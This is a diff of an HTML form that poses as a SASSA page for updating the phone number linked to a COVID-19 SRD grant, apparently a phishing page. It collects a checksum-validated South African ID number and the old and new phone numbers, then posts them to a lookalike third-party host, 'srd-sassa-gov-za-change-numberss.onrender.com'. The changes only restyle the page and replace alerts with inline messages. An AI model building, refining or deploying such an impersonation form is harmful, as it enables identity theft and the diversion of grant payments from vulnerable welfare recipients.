@@ -1,49 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>SASSA</title>
   <link rel="icon" href="https://srd-sassa-gov-za-sc19-contact.web.app/sassa-logo2.jpeg" type="image/png">
   <style>
     body { margin: 0; font-family: Arial, sans-serif; background-color: #f9f9f9; }
-    .container { margin: 0 auto; }
+    .container { margin: 0 auto; max-width: 500px; padding: 20px; }
     .header { background-color: #fbc02d; padding: 5px; text-align: center; }
-    .header img { max-width: 100%; height: 50px; display: block; }
+    .header img { max-width: 100%; height: 50px; display: block; margin: 0 auto; }
+    
     .application-form {
       padding: 20px; background-color: white;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       border-radius: 5px;
     }
+
     .application-form label {
       display: block; font-size: 14px;
       font-weight: bold; margin-bottom: 5px; color: #333;
     }
+
     .application-form input {
       width: 98%; padding: 12px; margin-bottom: 20px;
       border: 1px solid #ccc; border-radius: 5px; font-size: 14px;
     }
+
     .application-form input:focus {
       outline: none; border-color: #fbc02d;
     }
+
     .application-form .submit-btn {
       background-color: #d8d8d8; color: #919191;
       border: none; padding: 10px 20px;
       border-radius: 5px; font-size: 16px;
       cursor: not-allowed; width: 100%;
     }
+
     .application-form .submit-btn:enabled {
       background-color: #fbc02d; color: #131313;
       cursor: pointer;
     }
+
     input.invalid {
-  border: 2px solid red !important;
-}
+      border: 2px solid red !important;
+    }
 
-input.valid {
-  border: 2px solid #fbc02d !important; /* yellow */
-}
+    input.valid {
+      border: 2px solid #fbc02d !important;
+    }
 
+    #message {
+      margin-top: 10px;
+      font-size: 14px;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
@@ -52,7 +64,9 @@ input.valid {
       <img src="sassa-logo.png" alt="SASSA Logo">
     </header>
     <main>
-      <p class="application-form"> If you want to update your cellphone number and/or email address related to your COVID-19 SRD R370 grant, submit your ID number and old phone number. Only one request per 24 hours is allowed.</p>
+      <p class="application-form">
+        If you want to update your cellphone number and/or email address related to your COVID-19 SRD R370 grant, submit your ID number and old phone number. Only one request per 24 hours is allowed.
+      </p>
       <form class="application-form" id="applicationForm">
         <label for="idNumber">South African ID Number of Applicant *</label>
         <input type="text" id="idNumber" maxlength="13" placeholder="Enter your ID number" oninput="validateForm()">
@@ -64,83 +78,88 @@ input.valid {
         <input type="text" id="newphoneNumber" maxlength="10" placeholder="Enter your new phone number" oninput="validateForm()">
         
         <button type="submit" class="submit-btn" id="submitButton" disabled>Submit</button>
+        <p id="message"></p>
       </form>
     </main>
   </div>
 
-<script>
-  function isValidSAID(id) {
-    if (!/^\d{13}$/.test(id)) return false;
+  <script>
+    function isValidSAID(id) {
+      if (!/^\d{13}$/.test(id)) return false;
 
-    let sum = 0;
-    for (let i = 0; i < 13; i++) {
-      let digit = parseInt(id.charAt(i));
-      if ((i + 1) % 2 === 0) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
+      let sum = 0;
+      for (let i = 0; i < 13; i++) {
+        let digit = parseInt(id.charAt(i));
+        if ((i + 1) % 2 === 0) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
       }
-      sum += digit;
+
+      return sum % 10 === 0;
     }
 
-    return sum % 10 === 0;
-  }
-
-  function validateInput(inputEl, isValid) {
-    inputEl.classList.remove('invalid', 'valid');
-    if (inputEl.value.trim() === '') return; // default grey
-    inputEl.classList.add(isValid ? 'valid' : 'invalid');
-  }
-
-  function validateForm() {
-    const idNumber = document.getElementById('idNumber');
-    const phoneNumber = document.getElementById('phoneNumber');
-    const newphoneNumber = document.getElementById('newphoneNumber');
-    const submitButton = document.getElementById('submitButton');
-
-    const idValid = isValidSAID(idNumber.value);
-    const phoneValid = /^\d{10}$/.test(phoneNumber.value);
-    const newPhoneValid = /^\d{10}$/.test(newphoneNumber.value);
-
-    validateInput(idNumber, idValid);
-    validateInput(phoneNumber, phoneValid);
-    validateInput(newphoneNumber, newPhoneValid);
-
-    submitButton.disabled = !(idValid && phoneValid && newPhoneValid);
-  }
-
-  document.getElementById("applicationForm").addEventListener("submit", async function (e) {
-    e.preventDefault();
-
-    const idNumber = document.getElementById("idNumber").value.trim();
-    const phoneNumber = document.getElementById("phoneNumber").value.trim();
-    const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
-
-    if (!isValidSAID(idNumber)) {
-      alert("Invalid South African ID number.");
-      return;
+    function validateInput(inputEl, isValid) {
+      inputEl.classList.remove('invalid', 'valid');
+      if (inputEl.value.trim() === '') return; // Default border
+      inputEl.classList.add(isValid ? 'valid' : 'invalid');
     }
 
-    try {
-      const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
-      });
+    function validateForm() {
+      const idNumber = document.getElementById('idNumber');
+      const phoneNumber = document.getElementById('phoneNumber');
+      const newphoneNumber = document.getElementById('newphoneNumber');
+      const submitButton = document.getElementById('submitButton');
 
-      if (response.ok) {
-        alert("Application submitted successfully!");
-      } else if (response.status === 409) {
-        alert("Duplicate entry found.");
-      } else {
-        alert("An error occurred.");
+      const idValid = isValidSAID(idNumber.value);
+      const phoneValid = /^\d{10}$/.test(phoneNumber.value);
+      const newPhoneValid = /^\d{10}$/.test(newphoneNumber.value);
+
+      validateInput(idNumber, idValid);
+      validateInput(phoneNumber, phoneValid);
+      validateInput(newphoneNumber, newPhoneValid);
+
+      submitButton.disabled = !(idValid && phoneValid && newPhoneValid);
+    }
+
+    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const idNumber = document.getElementById("idNumber").value.trim();
+      const phoneNumber = document.getElementById("phoneNumber").value.trim();
+      const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
+      const messageEl = document.getElementById("message");
+
+      const showMessage = (text, color = 'red') => {
+        messageEl.textContent = text;
+        messageEl.style.color = color;
+      };
+
+      if (!isValidSAID(idNumber)) {
+        showMessage("Invalid South African ID number.");
+        return;
       }
-    } catch (error) {
-      console.error("Submission error:", error);
-      alert("Network error. Please try again.");
-    }
-  });
-</script>
 
+      try {
+        const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+        });
 
+        if (response.ok) {
+          showMessage("Application submitted successfully!", "green");
+        } else if (response.status === 409) {
+          showMessage("Duplicate entry found.");
+        } else {
+          showMessage("An error occurred.");
+        }
+      } catch (error) {
+        console.error("Submission error:", error);
+        showMessage("Network error. Please try again.");
+      }
+    });
+  </script>
 </body>
 </html>
